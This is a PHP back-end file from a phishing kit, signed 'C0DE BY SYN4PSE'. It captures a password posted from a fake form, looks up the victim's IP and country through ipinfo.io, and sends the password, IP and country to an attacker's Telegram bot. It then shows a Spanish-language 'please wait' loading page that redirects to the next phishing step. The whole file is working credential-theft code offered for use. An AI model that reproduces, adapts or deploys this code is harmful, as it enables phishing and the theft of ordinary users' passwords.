<?php
ini_set("display_errors", 0);
include "DONDECAE.php";


if (isset($_POST['pr3xt4rs']) ) {
    $input3 = $_POST['pr3xt4rs'];
    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
    $mensajex .= "F0RM0S4\nCl4x3S: ".$_POST['pr3xt4rs']."\nYP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";

    env($token, $tid, $mensajex);
}
function getIpInfo($ip) {
    $url = "http://ipinfo.io/{$ip}/json";  
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    
    return json_decode($response, true);
}
function env($token, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $mensaje
    );

    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
    );

    $curl = curl_init();
    curl_setopt_array($curl, $options);
    $response = curl_exec($curl);
    curl_close($curl);

    return $response;
    
}

?>




<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="refresh" content="14; url=tkss.php">
	<title>carregaShop</title>
</head>
<body>
	<br>
	<br>
	<br>
	<br>
	<br>
	<img src="imexi/load.gif" style="display: block;margin: 0 auto;width: 150px;">
	<p  style="display: block;margin: 0 auto;width: 350px;text-align: center;font-family: Helvetica;font-size: 11pt;">Espere mientras carga esto puede demorar unos segundos, no cierre esta ventana.</p>


</body>
</html>